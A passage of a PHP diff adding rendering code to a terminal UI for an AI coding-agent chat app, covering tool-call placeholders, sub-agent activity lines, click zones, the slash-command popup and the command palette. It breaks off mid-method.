+     * colour and adds italics and its own `notice: ` label.
+     *
+     * Italic rather than SGR 2 (faint) for the reason {@see dim()} gives: faint
+     * darkens the projected colour under {@see Theme::CONTRAST_MIN}, and a
+     * notice is text the user has to read ("Queued (1 waiting)").
+     */
+    private static function notice(Theme $theme): Style
+    {
+        return self::dim($theme)->italic();
+    }
+
+    /**
+     * Pick the {@see Style} for one unified-diff line from its marker column.
+     * The `---`/`+++` file headers are matched before the bare `-`/`+` markers
+     * they start with, otherwise a diff's own header would render as a giant
+     * removal followed by a giant addition.
+     *
+     * Whether a `--- `/`+++ ` row IS a header is not decidable from the row
+     * alone — `--` opens a comment in SQL, Lua, Haskell and Ada, so a deleted
+     * `-- users table` arrives here looking exactly like a file header — so the
+     * verdict comes from {@see DiffGutter::fileHeaders()}, which walks the block
+     * and already knows whether a hunk is open. It is a required argument, not a
+     * defaulted one, so a future caller has to decide rather than silently get
+     * the ambiguous reading back.
+     */
+    private static function styleDiffLine(string $line, Theme $theme, bool $isHeader): Style
+    {
+        if ($isHeader) {
+            return Style::new()->foreground($theme->systemLabel)->bold();
+        }
+        if (str_starts_with($line, '@@')) {
+            return Style::new()->foreground(Color::ansi(6));
+        }
+        if (str_starts_with($line, '+')) {
+            return Style::new()->foreground(Color::ansi(2));
+        }
+        if (str_starts_with($line, '-')) {
+            return Style::new()->foreground(Color::ansi(1));
+        }
+
+        return self::dim($theme);
+    }
+
+    /**
+     * A "tool X is running" placeholder (see {@see Message::toolRunning()}) -
+     * shown the moment a tool call is dispatched, before it finishes, so a
+     * slow command doesn't look like nothing is happening. Replaced in
+     * history with {@see renderToolResults()}'s finished marker once the
+     * real result arrives (see Chat's ToolResultsMsg handling).
+     *
+     * A Task call's row also carries one live line per delegated run under
+     * it (roadmap P-B2, {@see \SugarCraft\Code\Tui\AgentActivityLine}) from $agents. A Task member
+     * still waiting for a free delegation slot (step 0.16's cap) says so on
+     * the row itself — `queued:`, not `running:` — because nothing is running
+     * yet and a spinner would claim otherwise.
+     *
+     * @param int $width the pane's usable columns; the live lines are fitted to it
+     */
+    private static function renderPendingToolCall(Message $msg, Theme $theme, array $expanded = [], int $width = 0, ?\SugarCraft\Code\Agents\Live\AgentLiveRegistry $agents = null, ?ImageLayer $images = null, ?Mosaic $mosaic = null, int $imageRows = 0): string
+    {
+        $runs = $agents === null ? [] : $agents->forCall((string) $msg->pendingToolCallId);
+        $queued = $runs !== [] && array_filter($runs, static fn ($run): bool => !$run->isQueued()) === [];
+        $spinner = Style::new()->foreground($theme->assistantLabel)->render($queued ? '◌' : '⠴');
+        $running = $spinner . ' ' . self::dim($theme)->render(Lang::t($queued ? 'tui.tool.queued' : 'tui.tool.running', ['call' => self::oneLine($msg->content)]));
+        $running .= self::agentLines($runs, $theme, $width, $agents);
+        $running .= self::previewLines((string) $msg->pendingToolCallId, $theme, $width, $images, $mosaic, $imageRows);
+
+        if ($msg->reasoning === null || trim($msg->reasoning) === '') {
+            return $running;
+        }
+
+        // Same key the finished row will compute (thoughtKey() reads the
+        // text only), so a thought opened while the call runs stays open.
+        return self::renderThought($msg->reasoning, $theme, $expanded, self::thoughtKey($msg->reasoning)) . "\n\n" . $running;
+    }
+
+    /**
+     * The live-render preview block under a running image call (W2.4): a dim
+     * percent/eta caption plus the newest diffusion frame, painted inside the
+     * PreviewPaint quarter-pane budget so a thumbnail never outshouts the
+     * chat. '' - leaving the row byte-identical to a no-preview render - when
+     * no slot exists, no display protocol resolved, or the frame cannot be
+     * drawn. Blob frames ride the sanctioned ImageLayer path (marker block in
+     * the frame, bytes out-of-band), exactly like {@see renderToolImage()}.
+     */
+    private static function previewLines(string $callId, Theme $theme, int $width, ?ImageLayer $images, ?Mosaic $mosaic, int $imageRows): string
+    {
+        if ($callId === '' || $images === null || $mosaic === null || $width <= 0) {
+            return '';
+        }
+
+        $slot = PreviewSlots::peek($callId);
+        if ($slot === null) {
+            return '';
+        }
+
+        $block = '';
+        $caption = self::previewCaption($slot['progress'], $slot['eta']);
+        if ($caption !== '') {
+            $block .= "\n" . self::dim($theme)->render(Width::truncate($caption, $width));
+        }
+
+        if ($slot['frameB64'] !== null) {
+            $painted = PreviewPaint::paint($slot['frameB64'], $mosaic, $width, $imageRows);
+            if ($painted !== null) {
+                $block .= "\n" . ($mosaic->isInline()
+                    ? $painted['body']
+                    : $images->place($painted['body'], $painted['cols'], $painted['rows']));
+            }
+        }
+
+        return $block;
+    }
+
+    /**
+     * "  42% · eta 8s" for whatever the server reported; '' when it reported
+     * neither. Progress arrives 0..1 upstream (A1111 /progress), clamped here
+     * against a co-tenant's out-of-range readout, never against the frame.
+     */
+    private static function previewCaption(?float $progress, ?float $eta): string
+    {
+        $parts = [];
+        if ($progress !== null) {
+            $parts[] = (string) max(0, min(100, (int) round($progress * 100))) . '%';
+        }
+        if ($eta !== null && $eta >= 0) {
+            $parts[] = 'eta ' . (string) (int) round($eta) . 's';
+        }
+
+        return $parts === [] ? '' : '  ' . implode(' · ', $parts);
+    }
+
+    /**
+     * The live lines of the runs under one Task row (roadmap P-B2), each on
+     * its own row after a newline, or '' when there are none to draw. Queued
+     * placeholders draw none — their row already says "queued".
+     *
+     * @param list<\SugarCraft\Code\Agents\Live\AgentLiveState> $runs
+     * @param float|null $elapsedSeconds the settled row's own duration, which
+     *        outranks the frames' clock for a finished run
+     * @param bool $settled the row is a settled result: a run under it that
+     *        never reported its end (the turn was cancelled, or died) draws
+     *        nothing, since a frozen spinner would claim it is still running
+     */
+    private static function agentLines(array $runs, Theme $theme, int $width, ?\SugarCraft\Code\Agents\Live\AgentLiveRegistry $agents, ?float $elapsedSeconds = null, bool $settled = false): string
+    {
+        if ($agents === null || $width <= 0) {
+            return '';
+        }
+
+        $lines = '';
+        $running = false;
+        foreach ($runs as $run) {
+            if ($run->isQueued() || ($settled && !$run->isFinished())) {
+                continue;
+            }
+            $line = \SugarCraft\Code\Tui\AgentActivityLine::render(
+                $run,
+                $width,
+                $theme,
+                $agents->spinnerFrame(),
+                $agents->now(),
+                $run->isFinished() && count($runs) === 1 ? $elapsedSeconds : null,
+            );
+            // Roadmap P-C2: each line opens its run's Agent View on a click.
+            self::recordAgentLineZone($run->id, $line);
+            $lines .= "\n" . $line;
+            $running = $running || !$run->isFinished();
+        }
+
+        // Appendix P §4.1's batch hint, once, under the LAST Task row of the
+        // batch that still has a run going — the newest such call in the
+        // registry's arrival order. Gone once the batch has finished.
+        if ($running && !$settled && $runs !== [] && self::lastRunningCall($agents) === $runs[0]->parentCallId) {
+            $hint = Chat::mouseClicksEnabled()
+                ? Lang::t(self::AGENT_BATCH_HINT) . ' · ' . Lang::t(self::AGENT_BATCH_HINT_CLICK)
+                : Lang::t(self::AGENT_BATCH_HINT);
+            $lines .= "\n" . self::dim($theme)->render(Width::truncate('    ' . $hint, $width));
+        }
+
+        return $lines;
+    }
+
+    /** Lang key of the batch hint under a running Task batch (Appendix P §4.1). */
+    public const AGENT_BATCH_HINT = 'tui.agent.batch_hint';
+
+    /**
+     * Click-zone prefix of a Task row's live agent line (roadmap P-C2):
+     * `agent-line:<runId>`. Not the strip's `agent:` — the strip lists the
+     * same runs in the same frame, and two zones with one id make the scan
+     * throw and cost the frame every zone.
+     */
+    public const AGENT_LINE_ZONE_PREFIX = 'agent-line:';
+
+    /** Lang key of its second half, said (after ` · `) only while clicks are on. */
+    public const AGENT_BATCH_HINT_CLICK = 'tui.agent.batch_hint_click';
+
+    /**
+     * The parent call id of the newest delegated run still going, or null.
+     */
+    private static function lastRunningCall(\SugarCraft\Code\Agents\Live\AgentLiveRegistry $agents): ?string
+    {
+        $last = null;
+        foreach ($agents->all() as $state) {
+            if (!$state->isFinished() && !$state->isQueued() && $state->parentCallId !== '') {
+                $last = $state->parentCallId;
+            }
+        }
+
+        return $last;
+    }
+
+    /**
+     * Live agent lines the current frame wants clickable (roadmap P-C2), as
+     * `['id' => runId, 'label' => the line's plain text]`, collected while the
+     * transcript is built and marked once the shell is drawn — the
+     * {@see $toolCallZones} detour, for the same layout reason.
+     *
+     * @var list<array{id: string, label: string}>
+     */
+    private static array $agentLineZones = [];
+
+    /**
+     * Remember that the live line $line of run $runId should become an
+     * `agent-line:<runId>` click zone. The id is the run's own
+     * (`subagent_<pid>_<uniqid>`), never its agent-supplied name, and is
+     * held to {@see Mark}'s charset like every zone id.
+     */
+    private static function recordAgentLineZone(string $runId, string $line): void
+    {
+        $zoneId = self::AGENT_LINE_ZONE_PREFIX . $runId;
+        $label = trim(\SugarCraft\Core\Util\Ansi::strip($line));
+        if ($label === '' || !Chat::mouseClicksEnabled()
+            || preg_match(self::ZONE_ID_CHARSET, $runId) !== 1 || strlen($zoneId) > Mark::MAX_ID_BYTES) {
+            return;
+        }
+
+        self::$agentLineZones[] = ['id' => $runId, 'label' => $label];
+    }
+
+    /**
+     * Turn each line recorded by {@see recordAgentLineZone()} into its
+     * `agent-line:` zone on the bordered shell, located by its plain text the way
+     * {@see markToolCalls()} locates a tool row — in order, each shell row
+     * claimed at most once, so two lines that read alike map to their own
+     * rows. A run drawn under two rows (never, today) keeps its first: a
+     * duplicate zone id would cost the whole frame its zones.
+     */
+    private static function markAgentLines(string $shell): string
+    {
+        if (self::$agentLineZones === []) {
+            return $shell;
+        }
+
+        $lines = explode("\n", $shell);
+        $from = 0;
+        $marked = [];
+        foreach (self::$agentLineZones as $zone) {
+            if (isset($marked[$zone['id']])) {
+                continue;
+            }
+            for ($i = $from, $n = count($lines); $i < $n; $i++) {
+                if (str_contains(\SugarCraft\Core\Util\Ansi::strip($lines[$i]), $zone['label'])) {
+                    $lines[$i] = Mark::zone(self::AGENT_LINE_ZONE_PREFIX . $zone['id'], $lines[$i]);
+                    $marked[$zone['id']] = true;
+                    $from = $i + 1;
+
+                    break;
+                }
+            }
+        }
+
+        return implode("\n", $lines);
+    }
+
+    /**
+     * What an expanded tool row ran, painted between its head and its output.
+     *
+     * A call with a string `command` argument (the shell tools) leads with a
+     * prompt line - `$ ls -la`, a multi-line script continued under it - since
+     * the command IS the call. Every other argument follows as a faint
+     * `key: value` line. `description` is left out: it is already the head's
+     * suffix, and repeating it is noise.
+     *
+     * The command is shown whole, as far as {@see INVOCATION_COMMAND_MAX_LINES}.
+     * Other values are clipped to {@see INVOCATION_VALUE_MAX_LINES} lines,
+     * because they are where a whole file body travels (`Write`'s `content`,
+     * `Edit`'s strings) and the diff below already shows that change.
+     * `ApplyPatch`'s `patch` goes further (roadmap 3.I-3): once the call
+     * landed, the result's per-file diff IS the patch, applied, so the patch
+     * text is left out rather than shown twice; a refused patch keeps it,
+     * since then it is the only record of what was asked.
+     *
+     * Model-authored, so every line is {@see untrusted()}-scrubbed and has its
+     * tabs expanded before it reaches the frame.
+     */
+    private static function renderInvocation(ToolResult $result, Theme $theme): string
+    {
+        $args = $result->arguments;
+        unset($args['description']);
+        if ($result->name === \SugarCraft\Code\Tools\BuiltIn\ApplyPatch::NAME && $result->hasDiff()) {
+            unset($args['patch']);
+        }
+        if ($args === []) {
+            return '';
+        }
+
+        $faint = self::dim($theme);
+        $out = [];
+
+        $command = $args['command'] ?? null;
+        if (is_string($command) && trim($command) !== '') {
+            unset($args['command']);
+            $prompt = Style::new()->foreground($theme->assistantLabel)->bold()->render('$');
+            foreach (self::invocationValueLines($command, self::INVOCATION_COMMAND_MAX_LINES) as $i => $line) {
+                $out[] = ($i === 0 ? $prompt . ' ' : '  ') . $line;
+            }
+        }
+
+        foreach ($args as $key => $value) {
+            $text = is_string($value) ? $value : (json_encode($value, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) ?: '');
+            foreach (self::invocationValueLines($text, self::INVOCATION_VALUE_MAX_LINES) as $i => $line) {
+                $out[] = $faint->render(($i === 0 ? self::oneLine((string) $key) . ': ' : '  ') . $line);
+            }
+        }
+
+        return implode("\n", $out);
+    }
+
+    /**
+     * One argument value as scrubbed display lines, clipped to $maxLines with
+     * a trailing `… N more lines` so the clip is never silent.
+     *
+     * @return list<string>
+     */
+    private static function invocationValueLines(string $value, int $maxLines): array
+    {
+        $text = str_replace("\t", '    ', self::untrusted(rtrim($value)));
+        $lines = array_map('rtrim', preg_split('/\r\n|\r|\n/', $text) ?: ['']);
+        $hidden = count($lines) - $maxLines;
+        if ($hidden > 0) {
+            $lines = array_slice($lines, 0, $maxLines);
+            $lines[] = Lang::t($hidden === 1 ? 'tui.tool.more_line' : 'tui.tool.more_lines', ['count' => $hidden]);
+        }
+
+        return $lines;
+    }
+
+    /**
+     * The "/" popup: {@see Chat::slashMenuMatches()}'s filtered command list,
+     * with the highlighted row ({@see Chat::slashMenuIndex()}) marked with
+     * "▸" and rendered brighter than the rest. Returns '' (nothing rendered)
+     * once matches is empty - inputBuf isn't slash-prefixed, already
+     * contains a space, or the typed prefix matches no command.
+     *
+     * Two things this surface used to lack that the Ctrl+P palette beside it
+     * already had (crush_code.md Phase 4 item 5):
+     *
+     * - the ARGUMENT HINT. `CommandSpec::$argumentHint` was parsed from command
+     *   frontmatter, set on the built-in rows that take arguments, and read by
+     *   nothing - so "/rename" gave no clue that it wants a name.
+     * - MATCHED-CHARACTER HIGHLIGHTING, through the SAME {@see Highlighter} and
+     *   the same reopen-the-row-style dance {@see renderPalette()} performs -
+     *   not a second implementation. What the popup needed was the indices,
+     *   which {@see CommandRegistry::filter()} was throwing away;
+     *   {@see Chat::slashMenuMatchResults()} is the seam that keeps them.
+     *
+     * WIDTH: the row is fitted to $budget as a WHOLE, in priority order -
+     * description first, then hint, then (only for a name too wide for the
+     * budget entirely) the name. A row wider than the frame is not a cosmetic
+     * problem here: {@see render()} paints one logical line per physical row,
+     * so an over-wide row collides with the one below it.
+     *
+     * Three different widths are involved and they are easy to confuse, so each
+     * is named with the domain it is true of - all three measured with
+     * `Width::string()` over `CommandRegistry::all()`, and all three
+     * `/websearch`'s:
+     *
+     * - its HINT ALONE is 58 columns,
+     * - its popup head `/name <hint>` is 69,
+     * - its `  /name <hint>` column in the `/help` listing is 71
+     *   (that one is {@see \SugarCraft\Code\Chat}'s domain, not this one).
+     *
+     * The hint is the first thing truncated after the description because the
+     * name is the row's identity and the description is what the row is FOR; a
+     * hint reduced to "<queâ¦" still says the command takes an argument, which
+     * is the whole job of showing it.
+     *
+     * The description clip is newer than the hint fitting and it is a FIX, not
+     * a refinement: until it landed nothing clipped the row, so the `/websearch`
+     * row rendered 45 columns wide (`Width::string()` on the stripped row,
+     * marker included) inside a 20-, 30- OR 40-column terminal - exactly the
+     * overflow this comment used to claim was impossible. Pinned at seven widths
+     * by `RendererTest::testSlashMenuFitsTheWholeRowNotJustTheHint()`.
+     */
+    private static function renderSlashMenu(Chat $chat, Theme $theme): string
+    {
+        $matches = $chat->slashMenuMatches();
+        if ($matches === []) {
+            return '';
+        }
+
+        $results = $chat->slashMenuMatchResults();
+        $selected = $chat->slashMenuIndex();
+
+        // The shell's own chrome, then this popup's border + padding(0, 1), then
+        // the two columns every row spends on its "▸ "/"  " marker.
+        //
+        // The 12-cell floor only holds while the terminal can afford it: the
+        // popup sits at column 0 below the input box, so its true ceiling is
+        // the terminal minus its OWN chrome and the marker. Without that cap
+        // the floor made the popup 18 cells wide on a 16-column terminal
+        // (audit 15b-09). Never below 1: the name clip below takes
+        // `$budget - 1`, and clipToWidth() is a codepoint cut, not a wrap.
+        $budget = max(1, min(
+            max(12, $chat->cols() - self::SHELL_CHROME_COLS - self::SLASH_MENU_CHROME_COLS - 2),
+            $chat->cols() - self::SLASH_MENU_CHROME_COLS - 2,
+        ));
+
+        $highlighter = new Highlighter();
+        // Underlined as well as recoloured, for the reason renderPalette() gives:
+        // the selected row is already bold userLabel, so colour alone would make
+        // its matched run indistinguishable from the rest of the row.
+        $matchStyle = Style::new()->foreground($theme->userLabel)->bold()->underline();
+
+        $lines = [];
+        foreach ($matches as $index => $spec) {
+            $rowStyle = $index === $selected
+                ? Style::new()->foreground($theme->userLabel)->bold()
+                : Style::new()->foreground($theme->systemLabel)->faint();
+
+            // Sanitized BEFORE any width is measured, so every clip below
+            // budgets the bytes that actually reach the terminal. CommandSpec::
+            // fromFile() already cleans a command file's text at load; this
+            // pass is defence in depth for every other way a spec is built
+            // (CommandSpec::new(), the bare constructor), because the popup is
+            // joined into the frame raw - an ESC/BEL/CR here goes straight to
+            // the wire (audit 15b-16).
+            $specName = self::slashMenuText($spec->name);
+            $description = self::slashMenuText($spec->description);
+            $argumentHint = $spec->argumentHint === null ? null : self::slashMenuText($spec->argumentHint);
+
+            $hint = self::fitSlashMenuHint($specName, $description, $argumentHint, $budget);
+
+            // The name keeps its columns ahead of everything else, so this clip
+            // only bites on a name wider than the whole budget - which the
+            // max(12, …) floor above rules out for every built-in row (the
+            // widest is `/websearch` at 10 columns with its slash, measured with
+            // `Width::string()` over `CommandRegistry::all()`) on any terminal
+            // of 18 columns or more, but not for a loaded custom command, whose
+            // name comes from a filename, nor on a terminal narrower than that.
+            // `$budget - 1` leaves the slash its cell. Floored at 0, not 1: at a
+            // 1-cell budget a 1-cell name plus the slash would be one cell
+            // wider than the popup was sized for.
+            $plainName = self::clipToWidth($specName, max(0, $budget - 1));
+            $tail = self::clipToWidth(
+                ' — ' . $description,
+                $budget - Width::string('/' . $plainName . $hint),
+            );
+
+            // Highlight the NAME only, and against the plain text: the styled
+            // run carries SGR bytes that no width budget can measure, so every
+            // clip above has to be decided before the highlighter runs.
+            $reopen = self::sgrOpen($rowStyle);
+            $match = $results[$index] ?? new MatchResult('', $spec->name, 0, []);
+            if ($match->haystack !== $plainName) {
+                // Re-key the match onto the name as CLIPPED. Highlighter drops
+                // indices past the end of its haystack, so a matched run the
+                // clip cut off simply stops being highlighted rather than
+                // slicing the wrong bytes out of the shorter string.
+                $match = new MatchResult($match->needle, $plainName, $match->score, $match->matchedIndices);
+            }
+            $name = $highlighter->highlight(
+                $match,
+                static fn(string $run): string => $matchStyle->render($run) . $reopen,
+            );
+
+            $lines[] = $rowStyle->render(($index === $selected ? '▸ ' : '  ') . '/' . $name . $hint . $tail);
+        }
+
+        return Style::new()
+            ->border(Border::normal())
+            ->borderForeground($theme->border)
+            ->padding(0, 1)
+            ->render(implode("\n", $lines));
+    }
+
+    /**
+     * The argument hint as it fits on one popup row, ' '-prefixed, or '' when
+     * this row has no hint or no room for one.
+     *
+     * Truncated to whatever is left after the name and the description have had
+     * their columns, and dropped outright rather than rendered as a bare "…"
+     * when fewer than {@see SLASH_MENU_MIN_HINT_COLS} columns remain - a
+     * one-character stub is noise, and a row with no hint is exactly what every
+     * row looked like before Phase 4.
+     */
+    private static function fitSlashMenuHint(string $name, string $description, ?string $hint, int $budget): string
+    {
+        if ($hint === null || $hint === '') {
+            return '';
+        }
+
+        $spent = Width::string('/' . $name . ' — ' . $description);
+        $room = $budget - $spent - 1;
+        if ($room < self::SLASH_MENU_MIN_HINT_COLS) {
+            return '';
+        }
+
+        return ' ' . self::clipToWidth($hint, $room);
+    }
+
+    /**
+     * One piece of a "/" popup row (name, description or hint) as a single
+     * control-free row: the marked-frame policy ({@see untrusted()}, which
+     * also drops zone sentinels a forged spec could use to claim clicks) and
+     * then {@see PaneLabel::of()}'s line-break flattening, since
+     * `untrusted()` deliberately keeps LF (and maps CR to LF) while the popup
+     * budgets exactly one line per row.
+     */
+    private static function slashMenuText(string $raw): string
+    {
+        return PaneLabel::of(self::untrusted($raw));
+    }
+
+    /**
+     * Hard-clip one already-laid-out run of plain text to $cols columns,
+     * ellipsis included, and to nothing at all when there are no columns left
+     * to spend. The one clip the "/" popup uses for all three of its parts, so
+     * the name, the hint and the description cannot drift into three different
+     * truncation rules.
+     *
+     * Plain text only: it measures with {@see Width::string()} and cuts with
+     * `mb_substr()`, neither of which can see an SGR escape, so every caller
+     * clips BEFORE it styles.
+     */
+    private static function clipToWidth(string $text, int $cols): string
+    {
+        if ($cols <= 0) {
+            return '';
+        }
+        if (Width::string($text) <= $cols) {
+            return $text;
+        }
+
+        $out = mb_substr($text, 0, max(1, $cols - 1));
+        while ($out !== '' && Width::string($out) > $cols - 1) {
+            $out = mb_substr($out, 0, mb_strlen($out) - 1);
+        }
+
+        return $out . '…';
+    }
+
+    /**
+     * The live session picker's content, composited over the whole frame by
+     * {@see render()} via {@see Veil} (crush_feat.md section 5 E8). Returns
+     * '' (nothing composited) when the picker is closed - see
+     * {@see Chat::sessionPicker()}.
+     *
+     * Sized against the same budget every other renderer here uses
+     * ({@see SHELL_CHROME_COLS} — 0 since CL-3 took the transcript shell's
+     * border out, so this is the raw terminal width), because the overlay is
+     * composited onto the frame the terminal paints whole. A further 4
+     * columns come off for
+     * {@see \SugarCraft\Code\Tui\SessionPicker::render()}'s own
+     * `border()->padding(0, 1)`, which wraps AROUND the width it is handed -
+     * without that subtraction the composited frame is wider than the
+     * terminal, and the diff renderer paints one logical line per physical
+     * row, so a wrapped row collides with the next one exactly like the
+     * overflow {@see render()}'s tail clip exists to prevent. The lower
+     * bounds keep the picker's separator `str_repeat()` calls non-negative
+     * on a very small terminal.
+     *
+     * E744 WS4 changed the last paragraph of this docblock's previous
+     * revision ("keyboard-driven only, and its rows carry no click ids"):
+     * the picker now marks its painted rows `session-row:<n>` exactly like
+     * {@see markPaletteItems()} marks the palette's, and the geometry comes
+     * from the SAME {@see SessionPicker::overlayGeometry()} the click
+     * whitelist re-derives, so a zone can only ever exist where a row was
+     * painted.
+     */
+    private static function renderSessionPicker(Chat $chat, Theme $theme): string
+    {
+        $picker = $chat->sessionPicker();
+        if ($picker === null) {
+            return '';
+        }
+
+        [$width, $height] = SessionPicker::overlayGeometry($chat->cols(), $chat->rows(), self::SHELL_CHROME_COLS);
+
+        $overlay = $picker->render($width, $height, $theme);
+        self::recordSessionRowZones(
+            $overlay,
+            $picker->rowZoneLines($width, $height, $theme),
+            $picker->selectedIndex(),
+            $picker->actionSegments($width, $theme),
+        );
+
+        return $overlay;
+    }
+
+    /**
+     * The `/new` folder picker, composited over the frame like the session
+     * picker and sized by the same rule
+     * ({@see \SugarCraft\Code\Tui\DirectoryPicker\DirectoryPicker::overlayGeometry()}),
+     * every line fitted to it. Keyboard-driven; the wheel moves its
+     * highlight ({@see Chat::dirPicker()}).
+     */
+    private static function renderDirectoryPicker(Chat $chat, Theme $theme): string
+    {
+        $picker = $chat->dirPicker();
+        if ($picker === null) {
+            return '';
+        }
+        [$width, $height] = \SugarCraft\Code\Tui\DirectoryPicker\DirectoryPicker::overlayGeometry($chat->cols(), $chat->rows(), self::SHELL_CHROME_COLS);
+
+        return $picker->render($width, $height, $theme);
+    }
+
+    /**
+     * The Ctrl+P command palette's content, composited over the whole frame
+     * by {@see render()} via {@see Veil}. Returns '' (nothing composited)
+     * when the palette is closed - see {@see Chat::palette()}.
+     *
+     * Rows come from {@see Chat::paletteMatchResults()} rather than the bare
+     * label list so the matched characters can be highlighted through
+     * {@see Highlighter} (crush_feat.md §4 E3). With no query typed, the root
+     * list arrives category-grouped and MRU-biased and gets a faint header
+     * per category (§4 E6/E7); a typed query stays a flat relevance-ranked
+     * list, headers omitted, so the best match is always the first row.
+     */
+    private static function renderPalette(Chat $chat, Theme $theme): string
+    {
+        $palette = $chat->palette();
+        if ($palette === null) {
+            return '';
+        }
+
+        $results = $chat->paletteMatchResults();
+        $selected = $palette->selectedIndex;
+        $grouped = $palette->query === '' && !$palette->isPicker();
+
+        // E3 (caret-paint half): the block caret is the palette's keyboard
+        // claim. Once the shell holds the keys - {@see self::$paletteAbandoned}
+        // - the builder must not forge that claim, so the query line paints
+        // without its tail. The input box caret is renderInput()'s own cursor
+        // and keeps drawing as usual. Wire-not-delete: the box still renders
+        // under hand-off; a caller that ever composites this overlay again
+        // loses only the caret, never a whole frame.
+        //
+        // E3 (caret-POSITION half): the glyph lands at PaletteState::$queryCursor,
+        // spliced between the query's halves exactly like renderInput() splices
+        // the draft's - same two-pass sanitise-then-measure, same cluster snap,
+        // same byte-identity when the caret is at the end (which is every state
+        // the pre-E3 keys could produce, so the older captures survive).
+        $caret = self::$paletteAbandoned ? '' : '█';
+        $cleanQuery = self::untrusted($palette->query);
+        $caretAt = self::snapToClusterStart(
+            $cleanQuery,
+            min(
+                mb_strlen($cleanQuery, 'UTF-8'),
+                mb_strlen(self::untrusted(
+                    mb_substr($palette->query, 0, $palette->queryCursor, 'UTF-8')
+                ), 'UTF-8'),
+            ),
+        );
+        $lines = [
+            '🔍 ' . mb_substr($cleanQuery, 0, $caretAt, 'UTF-8')
+                . $caret
+                . mb_substr($cleanQuery, $caretAt, null, 'UTF-8'),
+            '',
+        ];
+        /** @var array<int, string> $rows row index => the content line it produced */
+        $rows = [];
+        if ($results === []) {
+            $lines[] = Style::new()->foreground($theme->systemLabel)->faint()->render(Lang::t('palette.no_matches'));
+        } else {
+            $highlighter = new Highlighter();
+            // Underlined as well as recoloured: the selected row is already
+            // bold userLabel, so colour alone would make its matched run
+            // indistinguishable from the rest of the row.
+            $matchStyle = Style::new()->foreground($theme->userLabel)->bold()->underline();
+            $lastCategory = null;
+
+            foreach ($results as $index => $result) {
+                if ($grouped) {
+                    $category = $chat->paletteCategory($result->haystack);
+                    if ($category !== null && $category !== $lastCategory) {
+                        $lines[] = Style::new()->foreground($theme->systemLabel)->faint()->render($category);
+                        $lastCategory = $category;
+                    }
+                }
+
+                $rowStyle = $index === $selected
+                    ? Style::new()->foreground($theme->userLabel)->bold()
+                    : Style::new()->foreground($theme->systemLabel);
+                $reopen = self::sgrOpen($rowStyle);
+                $body = $highlighter->highlight(
+                    $result,
+                    static fn(string $run): string => $matchStyle->render($run) . $reopen,
+                );
+
+                $row = $rowStyle->render(($index === $selected ? '▸ ' : '  ') . $body);
+                $lines[] = $row;
+                $rows[$index] = $row;
+            }
+        }
+
+        $title = match ($palette->mode) {
+            'providers' => ' ' . Lang::t('palette.title.providers') . ' ',
+            // A provider name is a config key: no control or private-use rune
+            // reaches the border title.
+            'models' => ' ' . Lang::t('palette.title.models', ['provider' => (string) preg_replace('/\p{C}+/u', '', (string) $palette->provider)]) . ' ',
+            'themes' => ' ' . Lang::t('palette.title.themes') . ' ',
+            default => ' ' . Lang::t('palette.title.commands') . ' ',
+        };
+
+        $box = Style::new()
+            ->border(Border::rounded()->withTitle($title))
+            ->borderForeground($theme->border)
+            ->padding(1, 2)
+            ->width(50)
+            ->render(implode("\n", $lines));
+
+        self::recordPaletteItemZones($box, $rows);
+
+        return $box;
+    }
+
+    /**
+     * Remember which lines of the rendered palette box are clickable rows
+     * (crush_feat.md §8 E6), for {@see markPaletteItems()} to wrap once the
+     * box has been composited.
+     *
+     * A row is located by the content line it produced rather than by index,
+     * for the reason {@see markToolCalls()} gives: the box adds border and
+     * padding rows of its own, and the grouped root list interleaves faint
+     * category headers between the rows. Each box line is claimed at most
+     * once and the search resumes past the last claim, so two rows that
+     * render identical text still map to the two lines they were emitted on.
+     *
+     * The WHOLE box line is recorded, borders included: it is the exact
+     * substring `Veil::composite()` copies into the frame verbatim, which is
+     * what lets {@see markPaletteItems()} wrap only the palette's own cells
+     * instead of the full frame row (a click on the dimmed backdrop beside
+     * the palette must not select a row).
+     *
+     * @param array<int, string> $rows row index => the content line it produced
+     */
+    private static function recordPaletteItemZones(string $box, array $rows): void
+    {
+        if ($rows === [] || !Chat::mouseClicksEnabled()) {
+            return;
+        }
+
+        $lines = explode("\n", $box);
+        $from  = 0;
+        foreach ($rows as $id => $row) {
+            for ($i = $from, $n = count($lines); $i < $n; $i++) {
+                if (str_contains($lines[$i], $row)) {
+                    self::$paletteItemZones[] = ['id' => (string) $id, 'line' => $lines[$i]];
+                    $from                     = $i + 1;
+
+                    break;
+                }
+            }
+        }
+    }
+
+    /**
+     * Turn each palette box line recorded by {@see recordPaletteItemZones()}
+     * into a `picker-item:<index>` click zone on the ALREADY-composited frame
+     * (crush_feat.md §8 E6) — see {@see $paletteItemZones} for why the mark
+     * cannot happen before the composite.
+     *
+     * Only the box line's own cells are wrapped, not the frame row it landed
+     * on, so the dimmed backdrop on either side of the palette stays inert.
+     * A row whose box line is not found verbatim (the palette was clipped
+     * because the terminal is narrower than the box) is simply left
+     * unclickable; the arrow keys still reach it.
+     */
+    private static function markPaletteItems(string $frame): string
+    {
+        if (self::$paletteItemZones === []) {
+            return $frame;
+        }
+
+        $lines = explode("\n", $frame);
+        $from  = 0;
+        foreach (self::$paletteItemZones as $zone) {
+            for ($i = $from, $n = count($lines); $i < $n; $i++) {
+                $at = strpos($lines[$i], $zone['line']);
+                if ($at === false) {
+                    continue;
+                }
+
+                $lines[$i] = substr_replace(
+                    $lines[$i],
+                    Mark::zone(self::PALETTE_ITEM_ZONE_PREFIX . $zone['id'], $zone['line']),
+                    $at,
+                    strlen($zone['line']),
+                );
+                $from = $i + 1;
+
+                break;
+            }
+        }
+
+        return implode("\n", $lines);
+    }
+
+    /**
+     * Remember which lines of the rendered picker overlay are clickable rows
+     * (E744 WS4), for {@see markSessionRows()} to wrap once the box has been
+     * composited — the palette recorder's twin, kept separate because the
+     * two overlays never share a frame and the registries reset together.
+     *
+     * Same claim mechanics as {@see recordPaletteItemZones()}: located by the
+     * content line each row produced (not by index), each overlay line
+     * claimed at most once with the search resuming past the last claim, and
+     * the WHOLE rendered line recorded so the mark wraps only the picker's
+     * own cells, never the dimmed backdrop beside the box. The gated flag is
+     * the same `CANDY_CODE_DISABLE_MOUSE_CLICKS` law as everywhere else.
+     *
+     * @param array<int, string>    $rows     row index => the content line it produced
+     * @param array<string, string> $acts     the highlighted row's action glyphs, verb => styled glyph
+     */
+    private static function recordSessionRowZones(string $overlay, array $rows, int $selected = -1, array $acts = []): void
+    {
+        if ($rows === [] || !Chat::mouseClicksEnabled()) {
+            return;
+        }
+
